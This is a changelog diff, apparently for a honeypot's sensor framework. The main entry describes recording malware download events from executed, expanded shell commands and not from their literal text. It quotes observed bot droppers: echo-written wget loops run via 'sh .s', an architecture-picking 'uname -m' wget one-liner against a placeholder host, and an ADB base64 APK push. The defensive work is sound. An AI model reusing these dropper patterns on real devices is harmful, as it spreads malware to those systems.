@@ -18,6 +18,23 @@
   fixture fails) and executes each `fix` in bash against stub commands, failing on a parse error,
   stderr output, or a root-only command or env-file read without `sudo`.
 
+- **Download events come from what a line executes, not from the text it carries** - observed live
+  2026-10-08 (telnet) and on an SSH exec line: a bot wrote a dropper with `echo '... wget
+  http://H/$a ...' >> .s` lines and ran `sh .s`, and the sensor reported `http://H/$a`, unexpanded,
+  for the echo line and nothing for the fetch the loop ran; the SSH one-liner chose the binary with
+  `A=$(uname -m); case $A in x86_64)U=x86_64;; ... esac; wget http://H/$U` and reported `/$U`. A
+  fetch is now recorded when the evaluator runs it, from its expanded arguments, so loops, `sh
+  FILE`, `sh -c`, command substitutions and variables report the real URL (`http://H/mips` for the
+  observed script), and an `echo`/`printf` argument, here-document body or quoted assignment holding
+  a fetch reports nothing. `case ... esac` is now run rather than skipped, so the probe above picks
+  `/x86_64` on the Ubuntu persona and `/arm7` on the phone's `armv7l`. A URL still holding
+  `$name`, `$(..)` or a backtick, or built from a variable that is not set, is recorded as a
+  command with no `url`. The old lexical scan stays as a fallback for evidence the evaluator did
+  not reach (a skipped branch, functions, syntax errors), now read with the shell's tokenizer, and
+  one URL found both ways is one event (`crates/sensor-framework/src/shell/fetch.rs`). A line that
+  only opens a construct reports its fetches when the construct completes. Busybox `tftp -g -l FILE
+  HOST` saves under the basename of the remote name, as busybox 1.30 does.
+
 - **An ADB base64 APK loader no longer loops on `wc: not found`** - observed live 2026-10-07: a bot
   pushed an APK to `/data/local/tmp` in about 57 `echo -n '<base64>' >> f.b64` commands, checked
   `wc -c < f.b64`, got `sh: wc: not found` from the Android shell, deleted everything and started
